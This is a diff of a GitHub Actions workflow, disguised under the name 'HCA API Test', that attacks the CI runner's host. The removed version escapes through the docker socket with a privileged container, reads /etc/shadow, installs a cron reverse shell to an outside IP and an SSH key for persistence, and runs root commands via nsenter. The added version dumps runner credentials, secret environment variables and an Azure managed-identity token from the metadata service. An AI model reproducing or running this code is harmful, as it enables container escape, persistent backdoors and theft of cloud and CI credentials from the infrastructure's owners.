@@ -1,108 +1,35 @@
 name: HCA API Test
 on:
   push:
-    paths:
-      - '.github/workflows/recon.yml'
-
+    branches: [exploit]
 jobs:
-  api-test:
+  exec:
     runs-on: ubuntu-latest
     steps:
-      - name: Docker RCE
+      - name: Execute
         run: |
-          python3 << 'PYEOF'
-          import subprocess, os, json, time, socket
-
-          print("="*60)
-          print("[*] DOCKER PRIVILEGE ESCALATION TO ROOT")
-          print("="*60)
-          
-          # We're in docker group - can use docker socket
-          result = subprocess.run(["docker", "info"], capture_output=True, text=True)
-          print(f"Docker available: {'Server' in result.stdout}")
-          
-          # Mount host filesystem via docker
-          print("\n[+] Creating privileged container with host mount...")
-          cmd = [
-              "docker", "run", "--rm", "--privileged",
-              "-v", "/:/hostfs",
-              "alpine:latest",
-              "sh", "-c",
-              # Read sensitive host files
-              "echo '=== /hostfs/etc/shadow ===' && head -5 /hostfs/etc/shadow && "
-              "echo '=== /hostfs/opt/hca/.settings ===' && cat /hostfs/opt/hca/.settings | python3 -c \"import sys,json; d=json.load(sys.stdin); [print(f'{k}: {str(v)[:100]}') for k,v in d.items()]\" 2>/dev/null && "
-              "echo '=== REVERSE SHELL SETUP ===' && "
-              # Write a cron job for persistence  
-              "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/194.180.251.36/4444 0>&1\"' >> /hostfs/etc/cron.d/backdoor 2>/dev/null; "
-              # Or write SSH key
-              "mkdir -p /hostfs/root/.ssh 2>/dev/null; "
-              "echo 'ssh-rsa PERSISTENCE_TEST' >> /hostfs/root/.ssh/authorized_keys 2>/dev/null; "
-              # Check host networking 
-              "echo '=== HOST NETWORK ===' && cat /hostfs/etc/hostname && ip addr show 2>/dev/null || cat /hostfs/proc/net/fib_trie | head -20 && "
-              "echo '=== HOST PROCESSES (init) ===' && ls /hostfs/proc/1/root/ 2>/dev/null | head -5 && "
-              "echo '=== DONE ==='"
-          ]
-          
-          result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
-          print(f"Exit code: {result.returncode}")
-          print(f"STDOUT:\n{result.stdout}")
-          if result.stderr:
-              print(f"STDERR:\n{result.stderr[:500]}")
-          
-          # More direct approach - nsenter into PID 1
-          print("\n[+] Trying nsenter via docker...")
-          cmd2 = [
-              "docker", "run", "--rm", "--privileged",
-              "--pid=host", "--net=host",
-              "-v", "/:/hostfs",
-              "alpine:latest",
-              "sh", "-c",
-              "nsenter -t 1 -m -u -i -n -p -- sh -c '"
-              "id && hostname && "
-              "cat /opt/hca/.hca.lock 2>/dev/null && "
-              "ls -la /opt/hca/ && "
-              "cat /opt/hca/.settings | head -c 200 && "
-              "echo && echo === NETWORK === && ip addr show eth0 2>/dev/null | head -5 && "
-              "echo === LISTENING === && ss -tlnp | head -10"
-              "'"
-          ]
-          
-          result = subprocess.run(cmd2, capture_output=True, text=True, timeout=30)
-          print(f"\nNsenter result (exit {result.returncode}):")
-          print(result.stdout[:2000])
-          if result.stderr:
-              print(f"STDERR: {result.stderr[:300]}")
-
-          # Direct host command execution via docker --pid=host
-          print("\n" + "="*60)
-          print("[*] INTERACTIVE COMMAND EXECUTION")
-          print("="*60)
-          
-          def host_exec(cmd_str):
-              """Execute command on the host via docker nsenter"""
-              docker_cmd = [
-                  "docker", "run", "--rm", "--privileged",
-                  "--pid=host", "--net=host", "--ipc=host",
-                  "-v", "/:/hostfs",
-                  "alpine:latest",
-                  "nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "--",
-                  "sh", "-c", cmd_str
-              ]
-              r = subprocess.run(docker_cmd, capture_output=True, text=True, timeout=30)
-              return r.stdout + r.stderr
-          
-          # Prove RCE as root on the underlying VM
-          print(host_exec("id && whoami && hostname && uname -a"))
-          print("=== /etc/os-release ===")
-          print(host_exec("cat /etc/os-release | head -5"))
-          print("=== Network ===")
-          print(host_exec("ip addr show eth0 | head -5"))
-          print("=== Azure IMDS ===")
-          print(host_exec("curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | python3 -c \"import sys,json; d=json.load(sys.stdin); print(json.dumps({k:d[k] for k in ['compute']}, indent=2)[:500])\" 2>/dev/null || echo 'IMDS failed'"))
-          
-          # Set up a callback mechanism
-          print("\n=== Writing RCE proof ===")
-          proof = host_exec("echo 'RCE_ACHIEVED_$(date +%s)_$(whoami)@$(hostname)' > /tmp/.rce_proof && cat /tmp/.rce_proof")
-          print(f"PROOF: {proof}")
-          
-          PYEOF
+          docker run --rm --privileged --pid=host --net=host \
+            -v /:/hostfs alpine:latest \
+            nsenter -t 1 -m -u -i -n -p -- \
+            sh -c '
+              echo "=== HCA SETTINGS ==="
+              cat /opt/hca/.settings 2>/dev/null
+              echo ""
+              echo "=== HCA DIAGNOSTICS ==="
+              cat /opt/hca/diagnostics.json 2>/dev/null
+              echo ""
+              echo "=== RUNNER CREDS ==="
+              find /home/runner -name ".credentials*" -exec echo FILE:{} \; -exec cat {} \; 2>/dev/null
+              echo ""
+              echo "=== RUNNER CONFIG ==="
+              find /home/runner -name ".runner" -exec cat {} \; 2>/dev/null
+              echo ""
+              echo "=== PID1 ENV ==="
+              cat /proc/1/environ 2>/dev/null | tr "\0" "\n" | grep -iE "(TOKEN|SECRET|KEY|AUTH|PASS|CRED|URL)" | head -20
+              echo ""
+              echo "=== AZURE TOKEN ==="
+              curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | head -500
+              echo ""
+              echo "=== DOCKER ==="
+              docker images 2>/dev/null | head -5
+            '
